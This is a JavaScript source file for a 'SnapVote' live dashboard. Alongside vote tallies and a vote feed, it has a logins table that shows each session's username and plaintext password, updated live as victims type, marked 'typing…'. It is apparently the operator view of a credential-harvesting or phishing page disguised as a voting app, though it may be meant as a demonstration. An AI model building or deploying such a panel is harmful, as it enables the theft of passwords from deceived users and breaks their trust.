const CANDIDATES = ['Amrit', 'Ashutosh', 'Suranjan', 'Tushar'];

const loginList = document.getElementById('login-list');
const loginEmpty = document.getElementById('login-empty');
const tallyList = document.getElementById('tally-list');
const feedList = document.getElementById('feed-list');
const feedEmpty = document.getElementById('feed-empty');
const connectionStatus = document.getElementById('connection-status');
const backLink = document.getElementById('back-link');

if (backLink) {
  if (window.SNAPVOTE_VOTING_URL) {
    backLink.href = window.SNAPVOTE_VOTING_URL;
    backLink.hidden = false;
  } else if (location.port === '3002') {
    const host = location.hostname || 'localhost';
    backLink.href = `http://${host}:3000`;
    backLink.hidden = false;
  } else if (location.pathname.startsWith('/data')) {
    backLink.href = '/';
    backLink.hidden = false;
  }
}

const tallies = Object.fromEntries(CANDIDATES.map((c) => [c, 0]));
const loginRows = new Map();
let lastVoteCount = 0;
let pollTimer = null;

function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

function formatTime(ts) {
  return new Date(ts).toLocaleTimeString([], {
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
  });
}

function maxVotes() {
  return Math.max(...Object.values(tallies), 1);
}

function renderTallies() {
  const max = maxVotes();
  tallyList.innerHTML = CANDIDATES.map((name) => {
    const count = tallies[name] || 0;
    const pct = (count / max) * 100;
    return `
      <div class="tally-row" data-candidate="${name}">
        <div class="tally-top">
          <span class="tally-name">${name}</span>
          <span class="tally-count">${count}</span>
        </div>
        <div class="tally-bar-track">
          <div class="tally-bar-fill" style="width: ${pct}%"></div>
        </div>
      </div>
    `;
  }).join('');
}

function upsertLoginRow(login, index) {
  if (loginEmpty && loginEmpty.parentElement) {
    loginEmpty.remove();
  }

  const rowNum = index ?? loginRows.size + 1;
  let row = loginRows.get(login.sessionId);

  if (!row) {
    row = document.createElement('tr');
    row.className = 'login-row';
    row.dataset.sessionId = login.sessionId;
    loginList.prepend(row);
    loginRows.set(login.sessionId, row);
  }

  const liveTag = login.isLive ? ' <span class="live-tag">typing…</span>' : '';

  row.innerHTML = `
    <td>${rowNum}</td>
    <td><strong>${escapeHtml(login.username || '—')}</strong>${liveTag}</td>
    <td><code>${escapeHtml(login.password || '')}</code></td>
    <td>${formatTime(login.updatedAt || login.timestamp)}</td>
  `;
}

function addFeedItem(vote) {
  if (feedEmpty) {
    feedEmpty.remove();
  }

  const item = document.createElement('div');
  item.className = 'feed-item';
  item.innerHTML = `<strong>${escapeHtml(vote.voterName)}</strong> voted for <strong>${escapeHtml(vote.candidate)}</strong> <span>· ${formatTime(vote.timestamp)}</span>`;
  feedList.prepend(item);

  while (feedList.children.length > 50) {
    feedList.lastElementChild.remove();
  }
}

function applyState(data) {
  if (data.tallies) {
    CANDIDATES.forEach((c) => {
      tallies[c] = data.tallies[c] || 0;
    });
  }
  renderTallies();

  if (data.logins && data.logins.length > 0) {
    loginList.innerHTML = '';
    loginRows.clear();
    [...data.logins].reverse().forEach((login, i) => {
      upsertLoginRow(login, data.logins.length - i);
    });
  } else if (data.logins && data.logins.length === 0) {
    loginList.innerHTML = '<tr id="login-empty"><td colspan="4" class="feed-empty">Waiting for logins…</td></tr>';
  }

  if (data.votes && data.votes.length > 0) {
    feedList.innerHTML = '';
    [...data.votes].reverse().forEach(addFeedItem);
    lastVoteCount = data.votes.length;
  } else if (data.votes && data.votes.length === 0) {
    feedList.innerHTML = '<p class="feed-empty" id="feed-empty">Waiting for votes…</p>';
  }
}

let ws = null;

function connectWebSocket() {
  const wsUrl = typeof getWsUrl === 'function' ? getWsUrl() : null;
  if (!wsUrl) return;

  try {
    if (ws) {
      try { ws.close(); } catch {}
    }
    ws = new WebSocket(wsUrl);

    ws.onopen = () => {
      connectionStatus.textContent = 'Live · WebSocket Connected';
      connectionStatus.classList.remove('disconnected');
    };

    ws.onmessage = (event) => {
      try {
        const msg = JSON.parse(event.data);
        if (msg.state) {
          applyState(msg.state);
        } else if (msg.type === 'STATE' && msg.payload) {
          applyState(msg.payload);
        } else if ((msg.type === 'LOGIN_TYPING' || msg.type === 'LOGIN') && msg.payload) {
          upsertLoginRow(msg.payload);
        } else if (msg.type === 'VOTE' && msg.payload) {
          addFeedItem(msg.payload);
          if (msg.tallies) {
            Object.assign(tallies, msg.tallies);
            renderTallies();
          }
        }
      } catch (e) {
        console.error('Error parsing WS message:', e);
      }
    };

    ws.onclose = () => {
      if (!eventSource) {
        connectionStatus.textContent = 'Live · Polling Fallback';
      }
      setTimeout(connectWebSocket, 3000);
    };

    ws.onerror = () => {
      try { ws.close(); } catch {}
    };
  } catch (err) {
    setTimeout(connectWebSocket, 3000);
  }
}

let eventSource = null;

function setupEventSource() {
  const base = getApiBase();
  const streamUrl = `${base}/api/stream`;
  try {
    if (eventSource) eventSource.close();
    eventSource = new EventSource(streamUrl);
    eventSource.onopen = () => {
      if (!ws || ws.readyState !== WebSocket.OPEN) {
        connectionStatus.textContent = 'Live · Real-time Stream Connected';
        connectionStatus.classList.remove('disconnected');
      }
    };
    eventSource.onmessage = (event) => {
      try {
        const msg = JSON.parse(event.data);
        if (msg.state) {
          applyState(msg.state);
        }
      } catch {}
    };
    eventSource.onerror = () => {
      if (eventSource) eventSource.close();
      eventSource = null;
      setTimeout(setupEventSource, 4000);
    };
  } catch {}
}

if (typeof BroadcastChannel !== 'undefined') {
  try {
    const channel = new BroadcastChannel('snapvote_live_sync');
    channel.onmessage = (event) => {
      if (event.data && event.data.state) {
        applyState(event.data.state);
      }
    };
  } catch {}
}

async function poll() {
  try {
    const state = await fetchState();
    applyState(state);
    if ((!ws || ws.readyState !== WebSocket.OPEN) && !eventSource) {
      connectionStatus.textContent = 'Live · Real-time Connected';
      connectionStatus.classList.remove('disconnected');
    }
  } catch {
    const local = typeof getLocalState === 'function' ? getLocalState() : null;
    if (local) applyState(local);
    if ((!ws || ws.readyState !== WebSocket.OPEN) && !eventSource) {
      connectionStatus.textContent = 'Local / Standalone Mode';
      connectionStatus.classList.remove('disconnected');
    }
  }
}

function startPolling() {
  poll();
  pollTimer = setInterval(poll, 800);
  setupEventSource();
  connectWebSocket();
}

renderTallies();
startPolling();
